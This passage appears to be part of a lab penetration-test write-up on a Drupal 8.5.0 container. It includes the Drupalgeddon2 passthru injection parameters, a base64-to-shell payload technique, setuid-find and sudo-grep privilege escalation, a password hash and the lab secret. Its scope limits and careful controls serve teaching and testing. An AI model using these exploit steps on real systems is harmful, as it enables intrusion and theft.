| # | Control | Positive control that proves this detector works | Negative evidence |
|---|---|---|---|
| C1 | The RCE oracle discriminates, rather than always answering | `…[#post_render][]=passthru` with `[#markup]=id` → **HTTP 200, 210 bytes, `uid=33(www-data) gid=33(www-data) groups=33(www-data)`** in the body | the **same request** with `…[#post_render][]=lab82_no_such_function_zz` → **HTTP 500, 68 bytes, zero bytes of `uid=` leaked**; the treatment re-run immediately afterwards in the same shell → 200/210 B with `uid=33` |
| C2 | `uid=33` really cannot read `/root` | hop 3 read the file's 35 bytes as euid 0 | the **identical** `cat /root/secretitomaximo.txt` and `ls -la /root/` as plain `www-data`, in the same request, → `cat: …: Permission denied` and `ls: cannot open directory '/root/': Permission denied` (rc=1 and rc=2) |
| C3 | The setuid oracle is a real file and not a fabrication | `/root/LAB82-1790794856-root`, `-rw-r--r-- 1 root www-data 98`, contents = the uid/euid pair and `Uid: 33 0 0 0` | the **same write one line later without the setuid find** → `cannot create …: Permission denied`. The marker is a timestamp, in a 0700 root directory, so it cannot be confused with anything pre-existing |
| C4 | The sudoers grant is pinned to two programs | `sudo -n -l` prints `User ballenita may run the following commands…` / `    (root) NOPASSWD: /bin/ls, /bin/grep` | `sudo -n /bin/cat /root/secretitomaximo.txt` → `sudo: a password is required` — a third program, same session, same identity |
| C5 | `ls` and `grep` are **not** interchangeable, so the two grant lines need two fixes | `sudo -n /bin/grep . /root/secretitomaximo.txt` → `nobodycanfindthispasswordrootrocks` | `sudo -n /bin/ls /root/secretitomaximo.txt` → prints `/root/secretitomaximo.txt` and **nothing else**: a `200`-shaped, successful, content-free result. Reading it as "the grant works for the reward" would have been the corpus's "a 200 with an empty body is `die`, not success" (§115, §168) wearing sudoers clothing |
| C6 | The 403 in `files/` is a real boundary, not a blanket refusal | a `.php` file at the **Drupal root** → **200, 22 B, `LAB82-PHP-EXEC uid=33`** — executing, in the same tree, minutes apart | a `.txt` in the **same** `files/` directory → **200, 40 B**; a nonexistent path → **404**. So 403 is specific to *subdirectory* + `.php`, and the 200s are not the server refusing everything |
| C7 | Drupal's `<FilesMatch>` is live and is *its* control, not Apache's | `GET /drupal/composer.lock` → **403**; `GET /drupal/sites/default/default.settings.php` → **403**; `GET /drupal/vendor/README.md` → **403** | `GET /drupal/robots.txt` → **200, 1 596 B** and `GET /drupal/core/CHANGELOG.txt` → **200, 399 B** in the same directory tree: the rule matches a set of extensions, not everything. Source: `drupal/.htaccess:6-8`, which names `composer\.(json\|lock)$` explicitly |
| C8 | `.ht.sqlite` is blocked by **name**, and only by name | a `.txt` in the identical directory → **200, 40 B** | `GET .ht.sqlite` → **403**, attributed to `<FilesMatch "^\.ht">` + `Require all denied` (`apache2.conf:195-197`) by the error log line `authz_core:error … AH01630: client denied by server configuration: /var/www/html/drupal/sites/default/files/.ht.sqlite` — the *only* 403 in this engagement with a log line naming its own cause |
| C9 | `settings.php` is not remotely readable | `/drupal/` and `/drupal/core/CHANGELOG.txt` render fine, so the server is serving the docroot | `settings.php` → 403; `.phps`, `.php~`, `.php.bak`, `%2ephp`, `index.php/settings.php` → 404/403. Seven variants, plus F7's whole-tree reason that no backup exists |
| C10 | The `/tmp/.htaccess` decoy is inert, and I can say *why* | it is 685 bytes, byte-identical in content to the shipped `files/.htaccess`, `-r--r--r-- www-data`, dated `Oct 16 2024` — it is unmistakably meant to be a guard | `DocumentRoot /var/www/html` (`000-default.conf:12`) and `/tmp` is outside it, so Apache never reads it. **A tester who greps `.htaccess` finds two guards and concludes the boundary is doubled. It is not — one of them is a photograph of a guard** |
| C11 | The stock `files/.htaccess` PHP-engine half is dead on this image | `apache2ctl -M` → `php7_module (shared)`, so `<IfModule mod_php5.c>` is **FALSE** | and yet a subdirectory `.php` still 403s — because the `SetHandler` line and the root `[F]` rule do the work. A tester who trusts the `php_flag` is trusting a control that is not running |
| C12 | `www-data`'s writable set is small, and two tools agree | `find / -xdev -writable -type f` **as www-data** → **49** files | an independent `test -w` loop over the same 49 → **49**. Two tools, same shell, same answer, and the count is large enough that "found nothing" and "looked nowhere" are distinguishable (§11, §14). The 49 are all in the docroot or the Twig cache; **0** are owned by another principal in a way that escalates |
| C13 | No other setuid or capability escalation | 14 setuid/setgid binaries, and `find` is provably the planted one (§4.4) | the other 13 are stock (`mount`, `su`, `umount`, `unix_chkpwd`, `chage`, `chfn`, `chsh`, `expiry`, `gpasswd`, `newgrp`, `passwd`, `sudo`, `wall`); `getcap -r /` → **0 lines**; `chroot` is **not** setuid, so there is no drop-privilege helper. The `su` and `sudo` refusals in §4.5 are measured, not assumed |
| C14 | No scheduled job, no mailer, no second service is a vector | `ps` names the whole process set: PID 1 `apache2 -DFOREGROUND` and five `www-data` children, and nothing else | no `cron`/`crond` binary is installed at all; no MTA (`mail()` has no transport, which is also why the CVE's `passthru` was the right choice over the mail-based variants); `/proc/net/udp` header only |
| C15 | The authenticated role has no permissions, so even a *successful* registration would be a ceiling | — | `config` row `user.role_authenticated` is the **empty string**. Not a "denied" answer; an empty permission set, which is the stronger form |
| C16 | The target did not change under me (the lab-108 hazard) | version re-read at the very end: `Drupal.php:85` still `8.5.0`; served header still `X-Generator: Drupal 8` | and structurally: `update` is **absent** from `core.extension` (so no request-triggered updater exists) **while egress is available** — `curl https://www.drupal.org` → **302**. Nothing stopped an update; there was nothing scheduled. This is lab 32's finding, re-confirmed: a CMS with a manual updater needs no network control, and you should not credit a hardened network for a version that was never going to move |
| C17 | The chain is a property of the target, not of a moment | the entire §4.3 transcript **replayed byte-for-byte** (1 204 bytes, identical text) on a container `docker rm`'d and recreated from `ejotapete:latest` | — |
| C18 | The editor/CKEditor AJAX surface is closed to anonymous | both editors exist and are enabled: `editor.editor.basic_html` and `editor.editor.full_html`, `status => true` | `GET /drupal/editor/dialog/image/{basic_html,full_html}` → **403**, and the reason is in the artefact: `EditorAccessControlHandler.php:19-22` delegates `use` to `$editor->getFilterFormat()->access('use', …)`, which anonymous does not hold. Two editors, one answer |

---

## 7. NOT tested (scope, not gaps in effort)

- **Any config import / `config.sync` write.** This is *the* Drupal-shaped write primitive (§3.2,
  point 3): 174 config objects in the `config` table, and `config_directories['sync']` at
  `settings.php:795` points at a directory of mode **775** that `www-data` can write. I did not
  import anything, because every route to the import UI requires an authenticated administrator and
  there is none reachable (N2, N3, C15). **So: unauthenticated config import is UNTESTED, and I make
  no claim about it in either direction** — the same posture lab 115 took with its LMS escalation.
- **Writing `sites/default/services.yml` as root.** The primitive is closed for `www-data` and I
  measured that (mode 555, `touch` → `Permission denied`). I did not test whether some *other* path in
  the image can write into a 555 directory.
- **Cracking `ballenita`'s SHA-512** (`$6$qpDmGZl6$zbw0hiPWUMk5x8VJOTotEmncYdbAc5pO.nQEozxykVTiydjJbJaLwUmKvx803Kh9IA3hs47jG/orkMBeqj3jF.`).
  It would take minutes on a GPU, and an euid-0 attacker can simply *set* the password instead. Not
  attempted; §4.5's claim is scoped accordingly and does not depend on it.
- **Brute-forcing the Drupal administrator's password** from the `users_field_data` hash. Not
  attempted; and there is no need, because F1 is unauthenticated.
- **Any CVE other than SA-CORE-2018-002.** SA-CORE-2019-003 (CVE-2019-0038) needs `rest` or JSON:API;
  `rest` is not in `core.extension` and JSON:API does not exist before 8.7, so it is **out of range
  for this version** — and per the engagement constraints a real third-party vulnerability is
  documented, never probed, anyway. The one CVE this engagement exercised was exercised **only
  against this lab container**, and the decision to do so is stated here rather than assumed: the
  governing constraint is *attack only your lab; no third-party infrastructure, ever*, and the
  catalogue's own precedent (lab 90, "real CVE in a WordPress plugin") is a CVE executed on the lab.
  There is also **no mailer in this image**, so the mail-delivery variants of the exploit family
  cannot send anything even accidentally.
- **Whether the `#post_render` vector reaches other forms or routes.** One form
  (`user_register_form`), one route, one `element_parents` path. The mechanism is general — the sink
  is in a shared element class — but I measured one instance of it and say so.
- **The `user_pass` route as a vector.** Four attempts, **0** executions, and the reason is in the
  artefact rather than guessed: `core/lib/Drupal/Core/Render/Element/Textfield.php:73-82` discards
  non-scalar input (`if (!is_scalar($input)) { $input = ''; }`), so the nested `#`-array never becomes
  an element property. The observable was a **500**, and the error log said why:
  `FormAjaxResponseBuilder.php:67: "The specified #ajax callback is empty or not callable."` — i.e. the
  form was cached clean and nothing executed. A `500` here is a **negative with a mechanism**, and it
  is listed here rather than under negatives only because the mechanism matters.

## 8. Discarded with reason

| Hypothesis | Why discarded |
|---|---|
| "It is not Drupal" — the reflex after labs 32/220/12/26 | `core/lib/Drupal.php:85` `const VERSION = '8.5.0'`, `DRUPAL_VERSION=8.5.0` in the image env, `standard.info.yml:47` `version: '8.5.0'`, served `X-Generator: Drupal 8`. **The label is right.** The point of the check was to establish that, not to assume it |
| "A contrib module or theme is the surface" | `modules/` and `themes/` hold **1** entry each (`README.txt`); 42 `core.extension` names, **41** resolve to a core directory and the 42nd is the *profile*. Zero third-party code in the deployment |
| "The Form API's `FormBuilder.php` is the vulnerable file" | `diff -u` between the shipped 8.5.0 copy and the 8.5.1 copy: **no output**. The fix is `Drupal\Core\Security\RequestSanitizer`, one layer above every form. Diffing the file that "must" be vulnerable proves nothing here (§4.1) |
| "Open registration gets me a session" | submission **succeeds** (303, cookie set) and creates `uid=2 status=0` with **0** role rows; `/drupal/user` → 302 to login, `/drupal/user/1` → 403. `register=visitors_admin_approval`, `verify_mail=1`. F6 files the *real* consequence; the foothold claim is false |
| "The CKEditor image dialog is the vector" | `/drupal/editor/dialog/image/{basic_html,full_html}` → 403; `EditorAccessControlHandler.php:19-22` delegates to the text format's `use` access, which anonymous lacks. Two editors, one answer (C18) |
| "`/drupal/.htaccess` and `files/.htaccess` both guard the tree" | the 7-state differential in F3: **deleting `files/.htaccess` changes nothing**, neutering `drupal/.htaccess:155` opens every subdirectory, and flipping one `AllowOverride` word does the same. One boundary, one rule, one dependency |
| "`php_admin_flag engine off` protects the files directory" | `apache2ctl -M` → `php7_module (shared)`; the stock guard's `<IfModule mod_php5.c>` is **FALSE**. It is not what is protecting anything, and the `SetHandler` line in the same file is redundant with the root rule (C11) |
| "`/tmp/.htaccess` is a second copy of the guard" | it is a photograph of one. `/tmp` is outside `DocumentRoot /var/www/html`; Apache never reads it (C10) |
| "A PHP file in the files directory executes" | **403**, in all 7 states of the differential except the two that deliberately break the guard. The 200-shaped control that makes this a *measured* negative and not an assumption is the same file at the Drupal root → 200, executing (C6) |
| "`sudo` reaches `ballenita`'s grant from the euid-0 position" | `sudo -n -u ballenita …` → `sudo: a password is required`, and `su -s /bin/sh ballenita` → `su: must be run from a terminal`. Both authenticate on the **real** uid, which the setuid-find hop leaves at 33. The two ladders are disjoint (§4.5) |
| "`/root/secretitomaximo.txt` is the Drupal user's password" | the Drupal user is `uid=1 ballenita find@dockerlabs.es`; the OS user is `ballenita:x:1000:…`. The file is the lab's reward string, and the two identities merely share a name. I did not attempt to use the string as a credential anywhere |
| "The reward is a `FLAG{}` somewhere" | §9's sweep: 23 898/23 898 files, 1 hit, inspected and it is `.ui-icon-flag{` in a Drupal aggregate CSS |

---

## 9. Reward

**No `FLAG{}` exists anywhere on this host.** Reported as a measured absence with the search, run
**as `euid=0(root)`** so there is no unsearchable location to caveat — executed through the
setuid-`find` hop, not through `docker exec`:

```
total files on -xdev:                                 23898
files the UNCAPPED content sweep opened:              23898
files containing flag{|FLAG{|ctf{|CTF{:                      1
the same, case-insensitive on the bare word FLAG:     1425
non-standard mounts checked:                                3
```

The single hit was **opened and read**, not reported: `sites/default/files/css/css_mMHZVBW…css`,
containing `.ui-icon-flag{background-position:-16px -112px;}` — a jQuery UI class in a Drupal
aggregate stylesheet. The 1 425 files containing the bare word `flag` are Drupal core. The three
mounts are Docker's own `/etc/resolv.conf`, `/etc/hostname`, `/etc/hosts`.

**Through the application's own store** (the filesystem sweep cannot see a SQLite page, and a
regression here is exactly lab 102's defect): **68 tables, 174 config objects, 1 real user
(`uid=1 ballenita`), 0 nodes, 1 role assignment (`uid=1 → administrator`).**

**What the platform did serve** is a file, and the file is the reward:

```
/root/secretitomaximo.txt   -rw-r--r-- 1 root root 35 Oct 16 2024
nobodycanfindthispasswordrootrocks
```

It is the **only** non-stock file in `/root` on the build date
(`find /root -maxdepth 1 -type f -newermt 2024-10-16 ! -newermt 2024-10-17` → 1 hit). The file itself
is mode 644; what protects it is the `drwx------` on `/root`, which is why the escalation is a real
step and not a misread mode. The reward is a functional secret, **not** a `FLAG{}`, and it is
reported as what the platform gave rather than reshaped into a format it did not use.

---

## 10. What the difficulty actually consisted of

Number of hops is not difficulty; this lab has three and none of them is a credential. Measured:

1. **The version is the whole question, and it is one file.** `8.5.0` versus `8.5.1` is one file and
   one call. Everything else — the WordPress-shaped question "which extension is vulnerable?", the
   Joomla-shaped question "read `Version.php` twice" — is the wrong question for this platform. The
   right one is *which `8.x.y` is this, and what did the next `8.x.y` change?*, and
   `GET /drupal/jsonapi` → 404 is a reminder that the same version question also decides which
   surfaces **exist** rather than which are **open**.
2. **The interesting file is the one that does not exist.** `RequestSanitizer.php` is 99 lines and it
   is the entire fix. I found it by grepping for a *class* I expected to be there, got 0, and that
   zero is the finding. A tester who greps for the vulnerability rather than for the control has to
   go to the project's git history to learn what the control is called.
3. **The sink is 15 lines inside a file about uploading images.**
   `ManagedFile::uploadAjaxCallback()` is a legitimate AJAX callback; its first two lines take a
   caller-supplied path into a data structure. The `#`-prefix convention that makes this dangerous is
   not a bug in Drupal — it is Drupal's render system working as designed, and the design assumes
   the input never contained `#`.
4. **The escalation is a file mode, and `dpkg -V` says nothing is wrong.** Fourteen setuid binaries,
   thirteen of them stock, and the odd one out is provably a post-install `chmod u+s` on a binary whose
   md5 still matches the package manifest. **The distro's own integrity checker is blind to modes**,
   so "the package verifies" is not "the file is as the package shipped it".
5. **The catalogue's "two distinct paths" is precise, and it is about *what each grant can do*, not
   about how many there are.** `ls` reveals names, `grep` reveals contents; the second is the reward
   and the first is not. An operator who reads the grant as "one rule, delete one program" closes
   nothing.
6. **What would have burned the budget:** hunting a contrib module (there are none), reading plugin
   PHP (there is no plugin tree), trusting the `Generator` header (it says `8`), trusting
   `files/.htaccess` (it is not the boundary), trusting the `/tmp/.htaccess` (it guards nothing),
   trusting `dpkg -V` (it checks md5, not modes), and reading `apache2.conf`'s `AllowOverride None`
   as the deployed value — **the last one is the near-miss, and it is §11.6 below.**

> **The one-sentence statement of the difficulty: the previous forty-nine engagements taught me to
> read the *sink* first, and on this platform the sink is selected by a query-string parameter, so
> every instinct trained on "grep the application code for the vulnerable function" pointed at
> `ManagedFile.php` for the wrong reason — the function is fine; the path into it is not.**

---

## 11. Instrumentation defects

Six. None is a defect in the target; all six are defects in how I measured it, and **two of them
would have inverted a finding.**

### 11.1 The wrong file, and it would have inverted F3 into a Critical

I read `/etc/apache2/apache2.conf:170-174` — `<Directory /var/www/> AllowOverride None` — and
concluded that **the entire Drupal subdirectory PHP boundary was void**, because `.htaccess` cannot
speak under `AllowOverride None`. I had the mechanism, the quote and the severity, and the site kept
returning 403 for my PHP file, which I was about to file as *my probe was wrong*.

It was not my probe. `grep -rn '<Directory' /etc/apache2/` finds a **second** block, in
`/etc/apache2/conf-enabled/docker-php.conf:8-11`, with `AllowOverride All`, included **later**
(`apache2.conf:222`) and therefore winning. Both files ship in the same official
`php:7.2.3-apache` image, they contradict each other, and **the one I read is not the one in effect.**

**The tell was structural, not numerical.** A 403 with **no error-log line** cannot be produced by a
broken directive — a `SetHandler` to a non-existent handler, a `php_flag` in the wrong scope, a
missing module, all of them log. Silence plus a 403 means an *authorisation* decision, and the
authorisation directives in the whole server config are exactly three blocks. I had the answer in the
error log two commands away and reached for a conclusion instead.

**This is §11 with a new costume, and the generalisation is worth stating: *before recording a
configuration finding, enumerate every file that can set the directive, and prove which one is
last-loaded.*** A duplicated directive across two files in the same config tree is not a rare
accident; in a base image that vendors both Apache and PHP it is the default. The number of
`AllowOverride` directives in this image is **2**, and I had read **1**.

### 11.2 The first three states of my own differential never fired

```
$ docker exec --user www-data … printf … > /var/www/html/drupal/sites/default/files/.htaccess
sh: 1: cannot create /var/www/html/drupal/sites/default/files/.htaccess: Permission denied
  b) only the <IfModule mod_php5.c> guard         403 326
  c) only the SetHandler catch-all                  403 326
  d) .htaccess deleted                              403 326
```

Three states, three identical 403s, and a `Permission denied` that scrolled past unexamined — the
file is `root`-owned mode **444**. **All three "results" were the unchanged shipped state**, which is
the corpus's §11/§12 shape exactly: a command that succeeded while doing nothing, manufacturing a
negative that confirmed what I hoped. It was caught only because states b–d were *supposed* to
differ and a 7-state differential with three identical rows is a result about the search.

Re-run with the privileged write inside the `setuid find` hop, the same three states produced three
*different* answers, and the real differential appeared.

### 11.3 `&` and `>` are HTML-escaped before they reach `sh` — a live instance of §15

```
$ # payload:  printf "%s|" "A>B&C<D>E"
$ # response:  A&gt;B&amp;CE
```

One layer of escaping, applied to the injected string, measurably: `>` → `&gt;`, `&` → `&amp;`.
`2>&1` becomes `2&gt;&1`, which `sh` parses as "background `2`, then run `gt`, then `1`" — the merge
silently disappears. A `>` redirect becomes `&gt;`, so the command is backgrounded and the output
lands on stdout instead of the file.

**This cost me six commands that I each read, in turn, as "the target refused".** The tell is in the
corpus already: lab 189 measured `htmlspecialchars` turning `&` into `&amp;` and reading the result as
a filter blocking the input, with the control and the negative differing by **one character**. Mine
differed by one character too — I just took longer to see it, because here the failure mode is
*plausible* rather than *absurd*: a backgrounded command whose output you can still read looks like
a command that ran.

The fix is not clever, it is mechanical: **base64 the payload and decode it inside the target**
(`echo <b64> | base64 -d | sh`), because no shell metacharacter ever crosses the escaping layer. I
should have reached for that after the first occurrence instead of the sixth.

### 11.4 `passthru` captures stdout only, and I read "empty" as "denied"

```
$ # payload:  ls -la /root/          as www-data
$ # response: (nothing)
$ # payload:  id ; echo A ; echo B   as www-data
$ # response: uid=33(www-data) ... / A / B        <- all three, fine
```

`ls -la /root/` as `www-data` writes `Permission denied` to **stderr**, which `passthru` does not
capture, so the response body was empty. For several minutes I read that as *the setuid vector did
not work*, because the neighbouring `id` command's output came back fine. It is the corpus's §14 in
a new place: **a tool that captured nothing and a tool that found nothing are byte-identical, and
only the work count distinguishes them** — here the work count is "0 bytes of stderr", and I had no
way to see stderr at all until I discovered the `&` problem in 11.3. The two defects fed each other:
the escaping bug stopped me merging stderr, and the missing stderr is what made the escaping bug
look like a refusal.

### 11.5 `error.log` is a symlink to `/dev/stderr`, so `tail` on it hangs forever

```
$ docker exec ejotapete_container tail -20 /var/log/apache2/error.log
  sl ...
$ ls -la /var/log/apache2/
lrwxrwxrwx 1 root root 11 access.log -> /dev/stdout
lrwxrwxrwx 1 root root 11 error.log -> /dev/stderr
```

`tail` on `/dev/stderr` blocks on a stream that never closes, and burned a 120-second tool timeout
before I looked at the symlink. The corpus's §7 applies with the emphasis inverted: the
`docker logs` **wrapper** is a filter and can summarise, so the fix is *both* "read the raw stream"
and "use `PATH=/usr/bin:/bin` when you do". Every error-log quotation in this writeup — the
`authz_core:error … AH01630` line in C8, the `FormAjaxResponseBuilder.php:67` message in §7 — came
from the raw stream, and **all three 403s that mattered had log lines except the one that mattered
most** (11.1), which is precisely why that one needed a structural argument instead.

### 11.6 My first oracle contained my own workstation's identity

```
$ cat > oracle_src.sh <<EOF        # unquoted heredoc
  id > /root/$S-root
  grep -E "^(Uid|Gid)" /proc/self/status >> /root/$S-root
  ls -la /root/ >> /root/$S-root
EOF                                # $(...) is NOT quoted, so the HOST expanded it
$ ./rce.sh oracle_src.sh
/bin/bash
1000
search14                            # <- the operator's shell, not the target's
```

The oracle file was created correctly (`-rw-r--r-- 1 root www-data 24`) and its *contents* were my
**workstation's** `id`, expanded at heredoc-construction time and base64'd into the payload. A root
oracle containing `1000 search14` — in a writeup about a container with exactly one non-system
account, `ballenita` — is the kind of artefact that survives review, because the file exists, the
mode is right, and the owner is `root`. It was caught by reading the file's contents rather than its
`ls` line, which is the same discipline as reading the one `flag{` hit in §9 instead of reporting
it.

The generalisation: **an oracle is a payload, and a payload built by string interpolation is a payload
that can interpolate the wrong machine.** Quote the heredoc, or generate the marker inside the
target, and then read the marker back.

### 11.7 Two smaller ones, recorded because they shaped conclusions

- **`dpkg -V findutils` reports a pristine tree while `/usr/bin/find` is mode 4755** (§4.4). I had
  used `dpkg -V` as the "is this stock?" check and it agreed with me. It verifies `md5sums`, not
  modes. An absence from a verifier is not an absence of the property — the same sentence as §14,
  applied to a package manager.
- **The first `POST` to `/drupal/user/register` used `mail[0][value]` and was rejected with
  `Username field is required.`** I had guessed the input names from another Drupal form. Reading the
  rendered form (`name="name"`, `name="mail"`, no `[]`) fixed it in one command. The guess cost two
  submissions, and both of them would have been perfectly good-looking evidence of "registration is
  closed" if I had stopped there — **a wrong input name produces the same "denied" answer as a right
  input name on a closed form.** The control that saved it was submitting a form I had *read*.

---

## 12. Restore

Recreated from the image, not by undoing edits, and verified **positively**:

```
$ docker rm -f ejotapete_container && docker run -d --name ejotapete_container ejotapete:latest
  IP                    -> 172.17.0.7
  front page            -> 200
  X-Generator           -> X-Generator: Drupal 8 (https://www.drupal.org)
  version               -> 8.5.0
  .ht.sqlite size       -> 6230016        (pre-engagement size; it grows with normal use)
  /root                 -> secretitomaximo.txt
  my lab82 artefacts    -> 0              (find over /var/www/html and /tmp)
  users in the store    -> 2              (uid 0 anonymous + uid 1 ballenita; uid 2 gone)
```

`/tmp` contains exactly the shipped `.htaccess`; no `.saved`, no `lab82_*`, no `/root/LAB82-*`. The
`user_register_form` account I created during the F6 measurement is gone, because the restore is a
recreation rather than a revert. No archive or image from other principals was touched.
